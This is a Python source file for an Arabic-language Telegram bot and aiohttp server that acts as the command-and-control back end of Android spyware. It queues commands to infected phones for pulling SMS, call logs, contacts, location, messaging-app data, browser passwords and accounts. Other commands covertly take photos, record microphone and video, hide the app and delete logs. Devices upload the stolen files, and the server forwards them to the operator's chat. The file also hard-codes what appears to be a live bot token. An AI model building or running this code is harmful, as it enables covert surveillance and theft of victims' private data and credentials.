#!/usr/bin/env python3
"""Al-Zahra Bot v8.0 - Real-time Response System"""

import asyncio
import json
import logging
import os
import random
import time
from datetime import datetime
from aiohttp import web

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('/var/log/alzahra_bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('AlZahra')

BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
OWNER_CHAT_ID = "7344776596"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8443
UPLOAD_DIR = "/opt/alzahra/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ═══════════════════════════════════════════
# تخزين البيانات
# ═══════════════════════════════════════════
class DataStore:
    def __init__(self):
        self.devices = {}
        self.commands = {}
        self.codes = {}
        self.last_update_id = 0
        self.pending_responses = {}  # انتظار الردود
        self.command_status = {}     # حالة كل أمر

store = DataStore()

# ═══════════════════════════════════════════
# أسماء الأوامر
# ═══════════════════════════════════════════
CMD_NAMES = {
    "sms": "📨 سحب SMS",
    "calls": "📞 سجل المكالمات",
    "contacts": "📇 جهات الاتصال",
    "notifications": "🔔 الإشعارات",
    "location": "📍 الموقع",
    "camera": "📷 الكاميرا",
    "whatsapp": "💬 واتساب",
    "messenger": "📩 ماسنجر",
    "instagram": "📸 انستقرام",
    "twitter": "🐦 تويتر",
    "snapchat": "👻 سناب شات",
    "tiktok": "🎵 تيك توك",
    "telegram": "✈️ تيليجرام",
    "viber": "📞 فايبر",
    "line": "💬 لاين",
    "skype": "📹 سكايب",
    "discord": "🎮 ديسكورد",
    "signal": "🔒 سيجنال",
    "wechat": "💬 وي تشات",
    "app_data": "📱 بيانات التطبيقات",
    "installed_apps": "📲 التطبيقات المثبتة",
    "running_apps": "🔄 التطبيقات العاملة",
    "photos": "🖼️ الصور",
    "videos": "🎬 الفيديوهات",
    "audio": "🎵 الملفات الصوتية",
    "documents": "📄 المستندات",
    "downloads": "⬇️ التحميلات",
    "all": "📦 سحب الكل",
    "all_zip": "🗜️ سحب ZIP",
    "backup_sms": "💾 نسخة SMS",
    "backup_calls": "💾 نسخة المكالمات",
    "backup_contacts": "💾 نسخة جهات الاتصال",
    "backup_whatsapp": "💾 نسخة واتساب",
    "backup_messenger": "💾 نسخة ماسنجر",
    "hide": "🔒 إخفاء",
    "unhide": "🔓 إظهار",
    "lock": "🔐 قفل الشاشة",
    "unlock": "🔓 فتح الشاشة",
    "restart": "🔄 إعادة تشغيل",
    "shutdown": "⏻ إيقاف",
    "record_on": "🎙️ تفعيل التسجيل",
    "record_off": "⏹️ إيقاف التسجيل",
    "record_mic": "🎤 تسجيل الميكروفون",
    "take_photo_front": "🤳 صورة أمامية",
    "take_photo_back": "📷 صورة خلفية",
    "record_video_front": "🎥 فيديو أمامي",
    "record_video_back": "🎬 فيديو خلفي",
    "screenshot": "📸 لقطة شاشة",
    "wifi_on": "📶 تفعيل WiFi",
    "wifi_off": "📴 إيقاف WiFi",
    "bluetooth_on": "🔵 تفعيل بلوتوث",
    "bluetooth_off": "⚫ إيقاف بلوتوث",
    "data_on": "📱 تفعيل البيانات",
    "data_off": "📵 إيقاف البيانات",
    "airplane_on": "✈️ وضع الطيران",
    "airplane_off": "🛬 إيقاف الطيران",
    "brightness_up": "🔆 زيادة السطوع",
    "brightness_down": "🔅 تقليل السطوع",
    "volume_up": "🔊 زيادة الصوت",
    "volume_down": "🔉 تقليل الصوت",
    "mute": "🔇 كتم الصوت",
    "vibrate": "📳 الاهتزاز",
    "silent": "🤫 الصامت",
    "normal": "🔔 العادي",
    "send_sms": "📤 إرسال SMS",
    "delete_sms": "🗑️ حذف SMS",
    "delete_call_log": "🗑️ حذف المكالمات",
    "browser_history": "🌐 سجل التصفح",
    "browser_bookmarks": "🔖 الإشارات",
    "browser_passwords": "🔑 كلمات المرور",
    "accounts": "👤 الحسابات",
    "google_accounts": "📧 حسابات جوجل",
    "battery_info": "🔋 البطارية",
    "cpu_info": "💻 المعالج",
    "ram_info": "🧠 الذاكرة",
    "storage_info": "💾 التخزين",
    "network_info": "📡 الشبكة",
    "device_info": "📱 معلومات الجهاز",
    "system_info": "⚙️ معلومات النظام",
    "clear_data": "🗑️ مسح البيانات",
    "clear_cache": "🧹 مسح الكاش",
    "clear_history": "🗑️ مسح السجل",
    "clipboard": "📋 الحافظة",
    "calendar": "📅 التقويم",
    "alarms": "⏰ المنبهات",
    "settings": "⚙️ الإعدادات",
    "permissions": "🔐 الصلاحيات",
    "about": "ℹ️ حول الجهاز",
    "sim_info": "📱 معلومات SIM",
    "imei": "🔢 IMEI",
    "ip": "🌐 IP Address",
}

# ═══════════════════════════════════════════
# رسائل الحالة
# ═══════════════════════════════════════════
STATUS_MESSAGES = {
    "pending": "⏳ في الانتظار...",
    "sent": "📤 تم الإرسال",
    "received": "📥 تم الاستلام",
    "executing": "🔄 جاري التنفيذ...",
    "success": "✅ تم بنجاح",
    "failed": "❌ فشل التنفيذ",
    "timeout": "⌛ انتهت المهلة",
    "offline": "📴 الجهاز غير متصل",
    "no_permission": "🚫 لا تملك صلاحية",
    "partial": "⚠️ تم جزئياً",
}

# ═══════════════════════════════════════════
# وظائف Telegram
# ═══════════════════════════════════════════
async def api_call(method, params=None):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            if params:
                async with s.post(f"{API}/{method}", data=params) as r:
                    return await r.json()
            else:
                async with s.get(f"{API}/{method}") as r:
                    return await r.json()
    except Exception as e:
        logger.error(f"API Error: {e}")
        return None

async def send_msg(chat_id, text, keyboard=None):
    params = {"chat_id": str(chat_id), "text": text, "parse_mode": "Markdown"}
    if keyboard:
        params["reply_markup"] = json.dumps(keyboard)
    return await api_call("sendMessage", params)

async def edit_msg(chat_id, msg_id, text, keyboard=None):
    params = {"chat_id": str(chat_id), "message_id": msg_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        params["reply_markup"] = json.dumps(keyboard)
    return await api_call("editMessageText", params)

async def answer_cb(query_id, text=None, show_alert=True):
    params = {"callback_query_id": query_id}
    if text:
        params["text"] = text
        params["show_alert"] = show_alert
    return await api_call("answerCallbackQuery", params)

async def send_file(chat_id, file_path, caption=""):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)
            data.add_field("parse_mode", "Markdown")
            data.add_field("document", open(file_path, "rb"))
            async with s.post(f"{API}/sendDocument", data=data) as r:
                return await r.json()
    except Exception as e:
        logger.error(f"Send file error: {e}")
        return None

# ═══════════════════════════════════════════
# لوحات المفاتيح
# ═══════════════════════════════════════════
def main_kb():
    return {"inline_keyboard": [
        [{"text": "📱 الأجهزة", "callback_data": "devices"}],
        [{"text": "🔗 ربط جهاز", "callback_data": "link"}],
        [{"text": "📊 الحالة", "callback_data": "status"}, {"text": "⚙️ الإعدادات", "callback_data": "settings"}]
    ]}

def devices_kb():
    if not store.devices:
        return {"inline_keyboard": [
            [{"text": "🔄", "callback_data": "devices"}],
            [{"text": "🔙", "callback_data": "back"}]
        ]}
    
    btns = []
    for did, info in store.devices.items():
        s = "🟢" if info.get("online") else "🔴"
        m = info.get("model", "?")
        btns.append([{"text": f"{s} {m}", "callback_data": f"dev_{did}"}])
    btns.append([{"text": "🔄", "callback_data": "devices"}])
    btns.append([{"text": "🔙", "callback_data": "back"}])
    return {"inline_keyboard": btns}

def device_kb(did):
    return {"inline_keyboard": [
        [{"text": "📨 SMS", "callback_data": f"c_{did}_sms"}, {"text": "📞 مكالمات", "callback_data": f"c_{did}_calls"}],
        [{"text": "📇 جهات", "callback_data": f"c_{did}_contacts"}, {"text": "🔔 إشعارات", "callback_data": f"c_{did}_notifications"}],
        [{"text": "📍 موقع", "callback_data": f"c_{did}_location"}, {"text": "📷 كاميرا", "callback_data": f"c_{did}_camera"}],
        [{"text": "💬 واتساب", "callback_data": f"c_{did}_whatsapp"}, {"text": "📩 ماسنجر", "callback_data": f"c_{did}_messenger"}],
        [{"text": "📱 تطبيقات", "callback_data": f"c_{did}_app_data"}, {"text": "🖼️ صور", "callback_data": f"c_{did}_photos"}],
        [{"text": "🎬 فيديو", "callback_data": f"c_{did}_videos"}, {"text": "🎵 صوت", "callback_data": f"c_{did}_audio"}],
        [{"text": "📄 مستندات", "callback_data": f"c_{did}_documents"}, {"text": "⬇️ تحميلات", "callback_data": f"c_{did}_downloads"}],
        [{"text": "📦 الكل", "callback_data": f"c_{did}_all"}, {"text": "🗜️ ZIP", "callback_data": f"c_{did}_all_zip"}],
        [{"text": "🔙", "callback_data": "devices"}]
    ]}

def settings_kb():
    return {"inline_keyboard": [
        [{"text": "🔒 إخفاء", "callback_data": "set_hide"}, {"text": "🔓 إظهار", "callback_data": "set_unhide"}],
        [{"text": "🔐 قفل", "callback_data": "set_lock"}, {"text": "🔓 فتح", "callback_data": "set_unlock"}],
        [{"text": "🎙️ تسجيل", "callback_data": "set_rec_on"}, {"text": "⏹️ إيقاف", "callback_data": "set_rec_off"}],
        [{"text": "📶 WiFi", "callback_data": "set_wifi"}, {"text": "🔵 بلوتوث", "callback_data": "set_bt"}],
        [{"text": "🔆 سطوع", "callback_data": "set_bright"}, {"text": "🔊 صوت", "callback_data": "set_vol"}],
        [{"text": "🗑️ مسح", "callback_data": "set_clear"}, {"text": "🔄 إعادة", "callback_data": "set_restart"}],
        [{"text": "🔙", "callback_data": "back"}]
    ]}

def command_status_kb(did, action):
    """أزرار متابعة حالة الأمر"""
    return {"inline_keyboard": [
        [{"text": "🔄 تحديث الحالة", "callback_data": f"status_{did}_{action}"}],
        [{"text": "📋 سجل الأوامر", "callback_data": f"history_{did}"}],
        [{"text": "🔙 رجوع", "callback_data": f"dev_{did}"}]
    ]}

# ═══════════════════════════════════════════
# معالجة الرسائل
# ═══════════════════════════════════════════
async def on_message(msg):
    cid = msg.get("chat", {}).get("id")
    txt = msg.get("text", "")
    
    if str(cid) != OWNER_CHAT_ID:
        await send_msg(cid, "⛔ غير مصرح")
        return
    
    if txt in ("/start", "/help"):
        await send_msg(cid, f"🎛️ *Al-Zahra v8.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
    
    elif txt == "/link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes:
            code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        store.codes[code] = {"chat_id": cid, "device_id": None}
        await send_msg(cid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق")
    
    elif txt == "/devices":
        await show_devices(cid)
    
    elif txt == "/status":
        await show_status(cid)
    
    else:
        await send_msg(cid, "❓ /start", main_kb())

async def on_callback(cb):
    cid = cb.get("message", {}).get("chat", {}).get("id")
    mid = cb.get("message", {}).get("message_id")
    data = cb.get("data", "")
    qid = cb.get("id")
    
    if str(cid) != OWNER_CHAT_ID:
        await answer_cb(qid, "⛔")
        return
    
    # التنقل
    if data == "back":
        await edit_msg(cid, mid, f"🎛️ *Al-Zahra v8.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
        return
    
    if data == "devices":
        await show_devices(cid, mid)
        return
    
    if data == "link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes:
            code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        store.codes[code] = {"chat_id": cid, "device_id": None}
        await edit_msg(cid, mid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق",
            {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]})
        return
    
    if data == "status":
        await show_status(cid, mid)
        return
    
    if data == "settings":
        await edit_msg(cid, mid, "⚙️ *الإعدادات*", settings_kb())
        return
    
    # الإعدادات
    if data.startswith("set_"):
        action = data[4:]
        await do_setting(cid, mid, action, qid)
        return
    
    # جهاز محدد
    if data.startswith("dev_"):
        did = data[4:]
        await show_device(cid, mid, did)
        return
    
    # حالة أمر معين
    if data.startswith("status_"):
        parts = data.split("_", 2)
        if len(parts) >= 3:
            did, action = parts[1], parts[2]
            await show_command_status(cid, mid, did, action, qid)
        return
    
    # سجل الأوامر
    if data.startswith("history_"):
        did = data[8:]
        await show_command_history(cid, mid, did)
        return
    
    # أوامر الجهاز
    if data.startswith("c_"):
        parts = data.split("_", 2)
        if len(parts) >= 3:
            did, action = parts[1], parts[2]
            await do_command(cid, mid, did, action, qid)
        return
    
    await answer_cb(qid, "❓")

# ═══════════════════════════════════════════
# تنفيذ الأوامر مع ردود فورية
# ═══════════════════════════════════════════
async def do_command(cid, mid, did, action, qid):
    """تنفيذ أمر مع رد فوري من السيرفر"""
    
    # التحقق من وجود الجهاز
    if did not in store.devices:
        await answer_cb(qid, "❌ الجهاز غير موجود")
        await send_msg(cid, f"❌ *خطأ*\n\nالجهاز غير موجود أو تم حذفه")
        return
    
    device = store.devices[did]
    device_name = device.get("model", "?")
    
    # التحقق من حالة الاتصال
    if not device.get("online"):
        await answer_cb(qid, "📴 الجهاز غير متصل")
        
        text = f"❌ *فشل الإرسال*\n\n"
        text += f"📱 الجهاز: {device_name}\n"
        text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
        text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n\n"
        text += f"📴 *السبب:* الجهاز غير متصل حالياً\n\n"
        text += f"💡 تأكد أن الجهاز متصل بالإنترنت"
        
        await send_msg(cid, text, command_status_kb(did, action))
        return
    
    # إنشاء معرف فريد للأمر
    cmd_id = f"{did}_{action}_{int(time.time())}"
    
    # إضافة الأمر للقائمة
    if did not in store.commands:
        store.commands[did] = []
    store.commands[did].append(action)
    
    # تسجيل حالة الأمر
    store.command_status[cmd_id] = {
        "device_id": did,
        "action": action,
        "status": "sent",
        "sent_time": time.time(),
        "response": None
    }
    
    # إرسال رسالة الإرسال
    await answer_cb(qid, f"📤 تم إرسال: {CMD_NAMES.get(action, action)}")
    
    text = f"📤 *تم إرسال الأمر*\n\n"
    text += f"📱 الجهاز: {device_name}\n"
    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
    text += f"📊 الحالة: {STATUS_MESSAGES['sent']}\n\n"
    text += f"⏳ في انتظار رد الجهاز..."
    
    msg_result = await send_msg(cid, text, command_status_kb(did, action))
    
    # انتظار رد الجهاز (30 ثانية)
    if msg_result and msg_result.get("ok"):
        msg_id = msg_result["result"]["message_id"]
        await wait_for_response(cid, msg_id, cmd_id, did, action, device_name)

async def wait_for_response(cid, msg_id, cmd_id, did, action, device_name):
    """انتظار رد الجهاز وتحديث الرسالة"""
    
    max_wait = 30  # 30 ثانية
    check_interval = 2  # كل ثانيتين
    
    for i in range(0, max_wait, check_interval):
        await asyncio.sleep(check_interval)
        
        # التحقق من وجود رد
        if cmd_id in store.command_status:
            status = store.command_status[cmd_id]
            
            if status.get("response"):
                response = status["response"]
                success = response.get("success", False)
                message = response.get("message", "")
                data_size = response.get("data_size", 0)
                
                if success:
                    text = f"✅ *تم التنفيذ بنجاح*\n\n"
                    text += f"📱 الجهاز: {device_name}\n"
                    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
                    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
                    text += f"📊 الحالة: {STATUS_MESSAGES['success']}\n"
                    
                    if data_size > 0:
                        text += f"📦 حجم البيانات: {data_size} bytes\n"
                    
                    if message:
                        text += f"\n📝 الرد:\n{message}"
                    
                    text += f"\n⏱️ مدة التنفيذ: {i + check_interval} ثانية"
                    
                    await edit_msg(cid, msg_id, text, command_status_kb(did, action))
                else:
                    text = f"❌ *فشل التنفيذ*\n\n"
                    text += f"📱 الجهاز: {device_name}\n"
                    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
                    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
                    text += f"📊 الحالة: {STATUS_MESSAGES['failed']}\n"
                    
                    if message:
                        text += f"\n📝 السبب:\n{message}"
                    
                    await edit_msg(cid, msg_id, text, command_status_kb(did, action))
                
                return
    
    # انتهت المهلة
    text = f"⌛ *انتهت المهلة*\n\n"
    text += f"📱 الجهاز: {device_name}\n"
    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
    text += f"📊 الحالة: {STATUS_MESSAGES['timeout']}\n\n"
    text += f"💡 الجهاز لم يرد خلال {max_wait} ثانية\n"
    text += f"تأكد أن الجهاز متصل وأن التطبيق يعمل"
    
    await edit_msg(cid, msg_id, text, command_status_kb(did, action))

async def show_command_status(cid, mid, did, action, qid):
    """عرض حالة أمر معين"""
    
    # البحث عن الأمر
    found = None
    for cmd_id, status in store.command_status.items():
        if status["device_id"] == did and status["action"] == action:
            found = status
            break
    
    if not found:
        await answer_cb(qid, "❓ لا يوجد سجل لهذا الأمر")
        return
    
    device = store.devices.get(did, {})
    device_name = device.get("model", "?")
    
    status_text = STATUS_MESSAGES.get(found["status"], found["status"])
    
    text = f"📋 *حالة الأمر*\n\n"
    text += f"📱 الجهاز: {device_name}\n"
    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
    text += f"📊 الحالة: {status_text}\n"
    text += f"⏰ الإرسال: {datetime.fromtimestamp(found['sent_time']).strftime('%H:%M:%S')}\n"
    
    if found.get("response"):
        resp = found["response"]
        text += f"\n📝 الرد:\n{resp.get('message', 'لا يوجد')}"
    
    await edit_msg(cid, mid, text, command_status_kb(did, action))

async def show_command_history(cid, mid, did):
    """عرض سجل الأوامر"""
    
    device = store.devices.get(did, {})
    device_name = device.get("model", "?")
    
    # تصفية الأوامر لهذا الجهاز
    device_commands = []
    for cmd_id, status in store.command_status.items():
        if status["device_id"] == did:
            device_commands.append(status)
    
    if not device_commands:
        text = f"📋 *سجل الأوامر*\n\n📱 {device_name}\n\n❌ لا توجد أوامر"
    else:
        text = f"📋 *سجل الأوامر*\n\n📱 {device_name}\n\n"
        for cmd in device_commands[-10:]:  # آخر 10 أوامر
            status_text = STATUS_MESSAGES.get(cmd["status"], cmd["status"])
            action_name = CMD_NAMES.get(cmd["action"], cmd["action"])
            time_str = datetime.fromtimestamp(cmd["sent_time"]).strftime('%H:%M:%S')
            text += f"• {action_name}\n  {status_text} | {time_str}\n\n"
    
    await edit_msg(cid, mid, text, device_kb(did))

async def do_setting(cid, mid, action, qid):
    settings_msg = {
        "hide": "🔒 تم إرسال أمر الإخفاء",
        "unhide": "🔓 تم إرسال أمر الإظهار",
        "lock": "🔐 تم إرسال أمر القفل",
        "unlock": "🔓 تم إرسال أمر الفتح",
        "rec_on": "🎙️ تم تفعيل التسجيل",
        "rec_off": "⏹️ تم إيقاف التسجيل",
        "wifi": "📶 تم تبديل WiFi",
        "bt": "🔵 تم تبديل البلوتوث",
        "bright": "🔆 تم تعديل السطوع",
        "vol": "🔊 تم تعديل الصوت",
        "clear": "🗑️ تم مسح البيانات",
        "restart": "🔄 تم إرسال إعادة التشغيل"
    }
    
    await answer_cb(qid, settings_msg.get(action, "✅ تم التنفيذ"))
    await send_msg(cid, f"⚙️ *الإعدادات*\n\n{settings_msg.get(action, '✅ تم التنفيذ')}")

async def show_devices(cid, mid=None):
    if not store.devices:
        t = "📱 *الأجهزة*\n\n❌ لا توجد"
    else:
        t = f"📱 *الأجهزة ({len(store.devices)})*\n\n"
        for did, i in store.devices.items():
            s = "🟢" if i.get("online") else "🔴"
            t += f"{s} {i.get('model', '?')} | {i.get('android', '?')}\n"
    
    if mid:
        await edit_msg(cid, mid, t, devices_kb())
    else:
        await send_msg(cid, t, devices_kb())

async def show_device(cid, mid, did):
    if did not in store.devices:
        await edit_msg(cid, mid, "❌ الجهاز غير موجود")
        return
    
    i = store.devices[did]
    t = f"📱 *{i.get('model', '?')}*\n\n"
    t += f"🤖 Android {i.get('android', '?')}\n"
    t += f"{'🟢' if i.get('online') else '🔴'} {'✅' if i.get('linked') else '⏳'}\n"
    t += f"⏰ {i.get('last_seen', '?')}"
    
    await edit_msg(cid, mid, t, device_kb(did))

async def show_status(cid, mid=None):
    try:
        import psutil
        c, m, d = psutil.cpu_percent(), psutil.virtual_memory().percent, psutil.disk_usage('/').percent
    except:
        c = m = d = 0
    
    conn = sum(1 for dev in store.devices.values() if dev.get("online"))
    total = len(store.devices)
    
    t = f"📊 *الحالة*\n💻 CPU: {c}%\n🧠 RAM: {m}%\n💾 Disk: {d}%\n📱 أجهزة: {conn}/{total}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
    kb = {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]}
    
    if mid:
        await edit_msg(cid, mid, t, kb)
    else:
        await send_msg(cid, t, kb)

# ═══════════════════════════════════════════
# استقبال التحديثات
# ═══════════════════════════════════════════
async def poll():
    while True:
        try:
            r = await api_call("getUpdates", {"offset": store.last_update_id + 1, "limit": 10, "timeout": 30})
            if r and r.get("ok"):
                for u in r.get("result", []):
                    store.last_update_id = u["update_id"]
                    if "message" in u:
                        await on_message(u["message"])
                    elif "callback_query" in u:
                        await on_callback(u["callback_query"])
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Poll error: {e}")
            await asyncio.sleep(5)

# ═══════════════════════════════════════════
# خادم الويب
# ═══════════════════════════════════════════
async def verify(request):
    try:
        d = await request.json()
        code = d.get("code")
        did = d.get("device_id")
        model = d.get("model", "?")
        android = d.get("android", "?")
        
        if code not in store.codes:
            return web.json_response({"status": "error", "message": "كود غير صحيح"})
        
        ci = store.codes[code]
        ci["device_id"] = did
        
        store.devices[did] = {
            "model": model, "android": android,
            "online": True, "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "linked": True, "owner": ci["chat_id"]
        }
        
        await send_msg(ci["chat_id"], f"✅ *تم ربط جهاز!*\n📱 {model}\n🤖 Android {android}")
        return web.json_response({"status": "ok", "device_id": did})
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

async def register(request):
    try:
        d = await request.json()
        did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            store.devices[did] = {"model": d.get("model", "?"), "android": d.get("android", "?"),
                "online": True, "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "linked": False}
        return web.json_response({"status": "ok"})
    except:
        return web.json_response({"status": "error"})

async def data(request):
    """استقبال البيانات من الجهاز مع تحديث حالة الأمر"""
    try:
        reader = await request.multipart()
        did = dtype = None
        path = None
        
        while True:
            part = await reader.next()
            if part is None: break
            if part.name == "device_id": did = await part.text()
            elif part.name == "type": dtype = await part.text()
            elif part.name == "file":
                fn = f"{did}_{dtype}_{int(time.time())}_{part.filename}"
                path = os.path.join(UPLOAD_DIR, fn)
                with open(path, "wb") as f:
                    while True:
                        chunk = await part.read_chunk()
                        if not chunk: break
                        f.write(chunk)
        
        if did and dtype:
            # تحديث حالة الأمر
            for cmd_id, status in store.command_status.items():
                if status["device_id"] == did and status["action"] == dtype:
                    status["status"] = "success"
                    status["response"] = {
                        "success": True,
                        "message": f"تم استلام البيانات",
                        "data_size": os.path.getsize(path) if path and os.path.exists(path) else 0
                    }
                    break
            
            # إرسال إشعار للمالك
            if did in store.devices and store.devices[did].get("linked"):
                owner = store.devices[did].get("owner")
                if owner:
                    await send_msg(owner, f"📥 *بيانات جديدة!*\n📱 {store.devices[did].get('model', '?')}\n📁 {dtype}")
                    if path and os.path.exists(path):
                        await send_file(owner, path, f"📱 {dtype}")
            
            return web.json_response({"status": "ok", "message": "تم الاستلام بنجاح"})
        
        return web.json_response({"status": "error", "message": "بيانات ناقصة"})
    except Exception as e:
        logger.error(f"Data error: {e}")
        return web.json_response({"status": "error", "message": str(e)})

async def commands(request):
    try:
        did = request.query.get("device_id", "")
        cmds = store.commands.get(did, [])
        store.commands[did] = []
        return web.json_response({"commands": cmds})
    except:
        return web.json_response({"commands": []})

async def status(request):
    try:
        d = await request.json()
        did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return web.json_response({"status": "ok"})
    except:
        return web.json_response({"status": "error"})

async def main():
    logger.info("=" * 60)
    logger.info("  Al-Zahra Bot v8.0 - Real-time Response")
    logger.info("=" * 60)
    
    app = web.Application()
    app.router.add_post("/api/verify_code", verify)
    app.router.add_post("/api/register", register)
    app.router.add_post("/api/data", data)
    app.router.add_get("/api/commands", commands)
    app.router.add_post("/api/status", status)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    
    logger.info(f"Server on port {PORT}")
    await poll()

if __name__ == "__main__":
    asyncio.run(main())
